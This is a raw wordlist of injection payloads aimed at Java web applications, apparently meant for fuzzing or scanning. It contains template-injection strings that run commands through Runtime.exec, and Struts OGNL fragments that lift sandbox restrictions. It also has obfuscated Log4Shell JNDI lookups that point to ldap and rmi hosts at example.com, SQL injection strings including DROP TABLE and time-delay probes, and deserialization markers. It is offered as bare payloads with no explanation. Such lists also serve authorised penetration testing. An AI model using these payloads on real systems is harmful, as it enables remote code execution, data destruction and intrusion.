'
"
`
\
\\
;
;;
|
||
&
&&
%
%%
#
##
/*
*/
//
///
{
}
{{
}}
${
#{
@{
%{
$(
${{
#{{
@{{
%{{
+
++
-
--
*
**
/
//
=
==
!=
<
>
<=
>=
<>
(
)
((
))
[
]
[[
]]
.
..
...
:
::
,
,,
!
!!
?
??
~
~~
^
^^
|
||
${1+1}
#{1+1}
*{1+1}
@{1+1}
~{1+1}
${7*7}
#{7*7}
${true}
#{false}
${null}
#{empty}
${pageContext}
${sessionScope}
${requestScope}
${applicationScope}
${param}
${paramValues}
${header}
${headerValues}
${cookie}
${initParam}
${pageScope}
${facesContext}
${view}
${component}
${cc}
${resource}
${flash}
${request}
${session}
${application}
${servletContext}
${config}
${out}
${exception}
${page}
${response}
${"".getClass()}
#{""["class"]}
${Class}
${System}
${Runtime}
${ProcessBuilder}
${Thread}
${ClassLoader}
${SecurityManager}
${System.getProperty("java.version")}
${System.getProperty("user.name")}
${System.getProperty("os.name")}
${System.getenv("PATH")}
${Runtime.getRuntime()}
${Class.forName("java.lang.Runtime")}
${Thread.currentThread()}
${Thread.currentThread().getContextClassLoader()}
${"".getClass().forName("java.lang.Runtime")}
${"".getClass().forName("java.lang.System")}
${applicationScope.getClass()}
${sessionScope.getClass()}
${requestScope.getClass()}
${pageContext.getClass()}
@Value
@Autowired
@Component
@Service
@Repository
@Controller
@RestController
@RequestMapping
@GetMapping
@PostMapping
@PutMapping
@DeleteMapping
@PatchMapping
@PathVariable
@RequestParam
@RequestBody
@ResponseBody
@Valid
@Validated
@Configuration
@Bean
@Profile
@Conditional
@ConditionalOnProperty
@EnableAutoConfiguration
@SpringBootApplication
@Entity
@Table
@Column
@Id
@GeneratedValue
@OneToMany
@ManyToOne
@JoinColumn
@Transactional
@Cacheable
@Async
@Scheduled
@EventListener
@PreAuthorize
@PostAuthorize
@Secured
@RolesAllowed
${@beanName}
#{@beanName}
${@configurationProperties}
${@environment}
${@applicationContext}
${@servletContext}
${T(java.lang.System)}
${T(java.lang.Runtime)}
${T(java.lang.Class)}
${T(java.lang.Thread)}
${T(java.lang.ProcessBuilder)}
${T(java.io.File)}
${T(java.nio.file.Files)}
${T(java.util.Scanner)}
${T(org.springframework.util.StreamUtils)}
${T(org.apache.commons.io.IOUtils)}
%{1+1}
%{7*7}
%{true}
%{false}
%{null}
%{#context}
%{#session}
%{#request}
%{#application}
%{#parameters}
%{#attr}
%{#root}
%{#this}
%{#stack}
%{#top}
%{#_memberAccess}
%{#_memberAccess.allowStaticMethodAccess=true}
%{@java.lang.System@getProperty('java.version')}
%{@java.lang.Runtime@getRuntime()}
%{@java.lang.Class@forName('java.lang.Runtime')}
%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)}
%{(#_memberAccess['allowStaticMethodAccess']=true)}
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}
%{(#ct=#request['struts.valueStack'].context)}
%{(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])}
%{(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))}
%{#application.get('org.apache.tomcat.InstanceManager')}
%{#tomcatInstanceManager=#application.get('org.apache.tomcat.InstanceManager')}
%{#potentialProcess=#tomcatInstanceManager.newInstance('java.lang.ProcessBuilder')}
#{bean.method}
#{managedBean.property}
#{facesContext}
#{facesContext.externalContext}
#{facesContext.externalContext.request}
#{facesContext.externalContext.session}
#{facesContext.externalContext.applicationMap}
#{facesContext.externalContext.sessionMap}
#{facesContext.externalContext.requestMap}
#{facesContext.externalContext.requestParameterMap}
#{facesContext.externalContext.requestHeaderMap}
#{view}
#{view.viewId}
#{component}
#{cc}
#{resource}
#{flash}
#{cookie}
#{header}
#{headerValues}
#{param}
#{paramValues}
#{initParam}
#{requestScope}
#{viewScope}
#{sessionScope}
#{applicationScope}
#{facesContext.externalContext.context}
#{facesContext.externalContext.context.getClass()}
#{sessionScope.getClass()}
#{applicationScope.getClass()}
<%
%>
<%%>
<%=
<%!
<%--
--%>
<jsp:
</jsp:
<c:
</c:
<fmt:
</fmt:
<fn:
<sql:
</sql:
<x:
</x:
${pageContext.request}
${pageContext.response}
${pageContext.session}
${pageContext.servletContext}
${pageContext.servletConfig}
${pageContext.out}
${pageContext.exception}
${pageContext.page}
${pageContext.errorData}
${pageContext.findAttribute("javax.servlet.error.exception")}
<%=request.getParameter("param")%>
<%=System.getProperty("java.version")%>
<%=Runtime.getRuntime()%>
<%Class.forName("java.lang.Runtime")%>
<%=Thread.currentThread()%>
.class
.getClass()
.forName(
.newInstance()
.getMethod(
.getMethods()
.getDeclaredMethod(
.getDeclaredMethods()
.getField(
.getFields()
.getDeclaredField(
.getDeclaredFields()
.getConstructor(
.getConstructors()
.getDeclaredConstructor()
.getDeclaredConstructors()
.invoke(
.setAccessible(
.getClassLoader()
.getContextClassLoader()
.getSystemClassLoader()
.loadClass(
.defineClass(
.getProtectionDomain()
.getCodeSource()
.getLocation()
.getName()
.getCanonicalName()
.getSimpleName()
.getPackage()
.getSuperclass()
.getInterfaces()
.isAssignableFrom(
.isInstance(
.cast(
.asSubclass(
Class.forName("java.lang.Runtime")
Class.forName("java.lang.System")
Class.forName("java.lang.ProcessBuilder")
Class.forName("java.lang.Thread")
Class.forName("java.io.File")
Class.forName("java.nio.file.Files")
Class.forName("javax.script.ScriptEngineManager")
Runtime.getRuntime()
Runtime.getRuntime().exec(
System.getProperty(
System.getenv(
System.exit(
ProcessBuilder
ProcessBuilder.start()
Thread.sleep(
Class.forName(
Method.invoke(
Field.set(
Constructor.newInstance(
File.
Files.
FileInputStream
FileOutputStream
FileReader
FileWriter
BufferedReader
BufferedWriter
Scanner
Properties.load(
ClassLoader.loadClass(
URLClassLoader
ScriptEngineManager
ScriptEngine.eval(
Compiler.compileClass(
MethodHandles.lookup()
VarHandle
Unsafe.getUnsafe()
ObjectInputStream
ObjectOutputStream
readObject(
writeObject(
readExternal(
writeExternal(
readResolve(
writeReplace(
serialVersionUID
Serializable
Externalizable
rO0AB
aced0005
java.io.ObjectInputStream
java.io.Serializable
java.lang.Runtime
java.lang.ProcessBuilder
org.apache.commons.collections
org.apache.commons.collections4
org.springframework.beans.factory
com.sun.org.apache.xalan.internal.xsltc.trax
javax.management.BadAttributeValueExpException
${jndi:ldap://
${jndi:rmi://
${jndi:dns://
${jndi:iiop://
${jndi:http://
${jndi:https://
${jndi:ldap://example.com/a}
${jndi:rmi://example.com:1099/a}
${jndi:${lower:l}${lower:d}a${lower:p}://example.com/a}
${${::-j}ndi:ldap://example.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com/a}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//example.com/a}
${${lower:jndi}:${lower:ldap}://example.com/a}
${${upper:jndi}:${upper:ldap}://EXAMPLE.COM/a}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://example.com/a}
#{7*7}
${7*7}
*{7*7}
@{7*7}
~{7*7}
[[${7*7}]]
[(${7*7})]
th:text="${7*7}"
th:utext="${7*7}"
${T(java.lang.System).getProperty('java.version')}
${T(java.lang.Runtime).getRuntime()}
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${T(java.lang.Thread).sleep(5000)}
${T(java.lang.Class).forName('java.lang.Runtime')}
${T(java.lang.ProcessBuilder).start()}
${T(java.io.File).exists()}
${T(java.nio.file.Files).readAllLines()}
#{T(java.lang.System).getProperty('java.version')}
#{T(java.lang.Runtime).getRuntime()}
#{T(java.lang.Runtime).getRuntime().exec('whoami')}
1' OR '1'='1
1" OR "1"="1
'; DROP TABLE users; --
"; DROP TABLE users; --
1' UNION SELECT null,null,null--
1" UNION SELECT null,null,null--
1' AND SLEEP(5)--
1" AND SLEEP(5)--
1'; WAITFOR DELAY '00:00:05'--
1"; WAITFOR DELAY '00:00:05'--
#{1=1}
${1=1}
:namedParam
?1
?2
?positionalParam
@Query
@NamedQuery
@NamedNativeQuery
createQuery(
createNativeQuery(
createNamedQuery(
getResultList()
getSingleResult()
setParameter(
setFirstResult(
setMaxResults(
Thread.sleep(5000)
TimeUnit.SECONDS.sleep(5)
System.nanoTime()
System.currentTimeMillis()
Calendar.getInstance()
Date.getTime()
Instant.now()
LocalDateTime.now()
${T(java.lang.Thread).sleep(5000)}
#{T(java.lang.Thread).sleep(5000)}
%{@java.lang.Thread@sleep(5000)}
sun.misc.Unsafe
com.sun.jndi.ldap.LdapCtxFactory
com.sun.jndi.rmi.registry.RegistryContextFactory
com.sun.management.ThreadMXBean
java.lang.management.ManagementFactory
javax.management.MBeanServer
javax.naming.InitialContext
javax.naming.Context
javax.script.ScriptEngineManager
javax.script.ScriptEngine
java.util.ServiceLoader
java.security.AccessController
java.security.PrivilegedAction
java.lang.invoke.MethodHandles
java.lang.invoke.MethodHandle
java.lang.invoke.MethodType
java.lang.invoke.VarHandle
NullPointerException
IllegalArgumentException
IllegalStateException
ClassNotFoundException
NoClassDefFoundError
NoSuchMethodException
NoSuchFieldException
SecurityException
ReflectiveOperationException
InvocationTargetException
InstantiationException
IllegalAccessException
ClassCastException
NumberFormatException
ArrayIndexOutOfBoundsException
StringIndexOutOfBoundsException
ConcurrentModificationException
UnsupportedOperationException
RuntimeException
Exception
Error
Throwable